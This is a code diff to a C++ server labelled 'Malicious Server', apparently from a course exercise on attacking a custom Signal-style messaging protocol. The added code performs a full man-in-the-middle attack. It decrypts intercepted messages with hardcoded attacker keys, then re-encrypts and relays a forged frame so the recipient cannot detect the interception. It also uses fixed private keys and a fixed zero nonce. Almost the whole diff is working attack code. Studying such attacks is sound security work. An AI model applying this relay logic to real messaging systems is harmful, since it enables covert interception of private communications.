@@ -27,6 +27,16 @@ mutex state_mutex;
 unordered_map<string, string> client_states;
 unordered_map<string, vector<string>> stored_opks, mailboxes;
 
+bool do_complete_mitm = true; //when turn on Bob will not be able to detect MITM
+
+//constants
+
+const uint8_t MALLORY_IK_PRIV[32]  = {0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f};
+const uint8_t MALLORY_SPK_PRIV[32] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f};
+const uint8_t MALLORY_OPK_PRIV[32] = {0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f};
+
+
+
 //Helpers
 
 bool read_complete_line(int socket, string &line) {
@@ -224,11 +234,122 @@ bool chacha20poly1305_decrypt(const vector<uint8_t> &key, const vector<uint8_t> 
     return false;
 }
 
-//constants
+// 6. ChaCha20-Poly1305 Encrypt (produces ciphertext || 16-byte tag)
+vector<uint8_t> chacha20poly1305_encrypt(const vector<uint8_t> &key, const string &plaintext, const vector<uint8_t> &ad) {
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    uint8_t nonce[12] = {0}; // Fixed zero nonce per protocol.md
 
-const uint8_t MALLORY_IK_PRIV[32]  = {0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f};
-const uint8_t MALLORY_SPK_PRIV[32] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f};
-const uint8_t MALLORY_OPK_PRIV[32] = {0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f};
+    EVP_EncryptInit_ex(ctx, EVP_chacha20_poly1305(), NULL, NULL, NULL);
+    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, NULL);
+    EVP_EncryptInit_ex(ctx, NULL, NULL, key.data(), nonce);
+
+    int len = 0;
+    if (!ad.empty()) {
+        EVP_EncryptUpdate(ctx, NULL, &len, ad.data(), ad.size());
+    }
+
+    vector<uint8_t> ct(plaintext.size());
+    EVP_EncryptUpdate(ctx, ct.data(), &len, (const uint8_t*)plaintext.data(), plaintext.size());
+
+    int final_len = 0;
+    EVP_EncryptFinal_ex(ctx, ct.data() + len, &final_len);
+
+    // Append 16-byte Poly1305 tag
+    uint8_t tag[16];
+    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_GET_TAG, 16, tag);
+    ct.insert(ct.end(), tag, tag + 16);
+
+    EVP_CIPHER_CTX_free(ctx);
+    return ct;
+}
+
+string create_bridged_frame(const string &plaintext, const string &recipient, const string &sender) {
+    string target_bundle = "";
+    string target_opk_b64 = "";
+    {
+        lock_guard<mutex> lock(state_mutex);
+        if (client_states.find(recipient) != client_states.end()) {
+            target_bundle = client_states[recipient];
+        }
+        if (client_states.find(recipient + "_opk") != client_states.end()) {
+            target_opk_b64 = client_states[recipient + "_opk"];
+        }
+    }
+
+    if (target_bundle.empty()) return "";
+
+    // 1. Extract recipient public keys
+    string target_ik_b64  = get_json_value(target_bundle, "ik_dh");
+    string target_spk_b64 = get_json_value(target_bundle, "spk");
+    if (target_opk_b64.empty()) {
+        target_opk_b64 = get_json_value(target_bundle, "opk");
+    }
+
+    vector<uint8_t> target_ik  = base64_decode(target_ik_b64);
+    vector<uint8_t> target_spk = base64_decode(target_spk_b64);
+    vector<uint8_t> target_opk = base64_decode(target_opk_b64);
+
+    // 2. Fixed ephemeral and ratchet private keys for the outbound session
+    const uint8_t EK_OUT_PRIV[32] = {0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f};
+    const uint8_t DHS_OUT_PRIV[32] = {0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf};
+
+    // 3. Compute 4 X3DH DH operations (protocol.md Section 3)
+    vector<uint8_t> dh1 = x25519_dh(MALLORY_IK_PRIV, target_spk.data()); // DH(IK_A, SPK_B)
+    vector<uint8_t> dh2 = x25519_dh(EK_OUT_PRIV,     target_ik.data());  // DH(EK_A, IK_B)
+    vector<uint8_t> dh3 = x25519_dh(EK_OUT_PRIV,     target_spk.data()); // DH(EK_A, SPK_B)
+    vector<uint8_t> dh4 = x25519_dh(EK_OUT_PRIV,     target_opk.data()); // DH(EK_A, OPK_B)
+
+    vector<uint8_t> ikm(32, 0xFF);
+    ikm.insert(ikm.end(), dh1.begin(), dh1.end());
+    ikm.insert(ikm.end(), dh2.begin(), dh2.end());
+    ikm.insert(ikm.end(), dh3.begin(), dh3.end());
+    ikm.insert(ikm.end(), dh4.begin(), dh4.end());
+
+    vector<uint8_t> salt(32, 0x00);
+    vector<uint8_t> sk = hkdf_sha256(salt, ikm, "AS3_X3DH", 32);
+
+    // 4. Sender Ratchet initialization (protocol.md Section 4.2)
+    vector<uint8_t> rk_dh = x25519_dh(DHS_OUT_PRIV, target_spk.data()); // DH(DHs, SPK_B)
+    vector<uint8_t> rk_out = hkdf_sha256(sk, rk_dh, "AS3_ROOT", 64);
+    vector<uint8_t> cks(rk_out.begin() + 32, rk_out.end());
+
+    // 5. Derive Message Key (MK)
+    vector<uint8_t> mk = hmac_sha256(cks, {0x01});
+
+    // 6. Associated Data: Initiator_IK + Recipient_IK (Candidate 4 from our earlier verification)
+    vector<uint8_t> initiator_ik_pub = x25519_get_public(MALLORY_IK_PRIV);
+    vector<uint8_t> ad = initiator_ik_pub;
+    ad.insert(ad.end(), target_ik.begin(), target_ik.end());
+
+    // 7. Encrypt the plaintext payload
+    vector<uint8_t> ct = chacha20poly1305_encrypt(mk, plaintext, ad);
+    string ct_b64 = base64_encode(ct);
+
+    // 8. Public keys for the wire header
+    string initiator_ik_b64 = base64_encode(initiator_ik_pub);
+    string ek_out_b64       = base64_encode(x25519_get_public(EK_OUT_PRIV));
+    string dhs_out_b64      = base64_encode(x25519_get_public(DHS_OUT_PRIV));
+
+    // 9. Format outbound JSON frame
+    string out_frame = 
+        "{\"from\":\"" + sender + "\","
+        "\"to\":\"" + recipient + "\","
+        "\"header\":{"
+            "\"dh\":\"" + dhs_out_b64 + "\","
+            "\"pn\":0,"
+            "\"n\":0,"
+            "\"init\":{"
+                "\"ik_sig\":\"" + initiator_ik_b64 + "\","
+                "\"ik_dh\":\""  + initiator_ik_b64 + "\","
+                "\"ek\":\""     + ek_out_b64 + "\","
+                "\"opk_id\":1"
+            "}"
+        "},"
+        "\"ct\":\"" + ct_b64 + "\"}";
+
+    return out_frame;
+}
+
 
 //Client Connection handler
 
@@ -244,9 +365,13 @@ void handle_client_connection(int client_socket, int mode) {
         }
         else if(type == "publish"){
             string bundle = get_json_object(line, "bundle");
+            string opk_pub = get_json_value(line, "pub"); 
             {
                 lock_guard<mutex> lock(state_mutex);
                 client_states[session_user] = bundle;
+                if(!opk_pub.empty()){
+                    client_states[session_user + "_opk"] = opk_pub;
+                }
             }
             cout<< "[Malicious Server] Published prekey bundle for : " << session_user << endl;
             send_complete_line(client_socket, "{\"type\":\"ok\",\"ok\":true,\"count\":5}");
@@ -348,7 +473,7 @@ void handle_client_connection(int client_socket, int mode) {
                     //Derive Message Key (MK) via HMAC-SHA256
                     vector<uint8_t> mk = hmac_sha256(ckr, {0x01});
 
-                                        // 7. Associated Data: Alice_IK_dh + Mallory_IK_dh_pub (protocol.md Section 3)
+                    // 7. Associated Data: Alice_IK_dh + Mallory_IK_dh_pub (protocol.md Section 3)
                     vector<uint8_t> mallory_ik_pub = x25519_get_public(MALLORY_IK_PRIV);
                     vector<uint8_t> ad = alice_ik;
                     ad.insert(ad.end(), mallory_ik_pub.begin(), mallory_ik_pub.end());
@@ -360,6 +485,13 @@ void handle_client_connection(int client_socket, int mode) {
                         cout << "[MODE 2 - MITM SUCCESS] RECOVERED PLAINTEXT:" << endl;
                         cout << ">>> \"" << recovered_plaintext << "\" <<<" << endl;
                         cout << "========================================================\n" << endl;
+                        if (do_complete_mitm) {
+                            string bridged = create_bridged_frame(recovered_plaintext, to_user, from_user);
+                            if (!bridged.empty()) {
+                                frame = bridged; // Replace raw frame with the newly encrypted frame
+                                cout << "[MODE 2] Re-encrypted frame queued for " << to_user << endl;
+                            }
+                        }
                     } else {
                         cout << "[MODE 2 - MITM] Decryption failed." << endl;
                     }
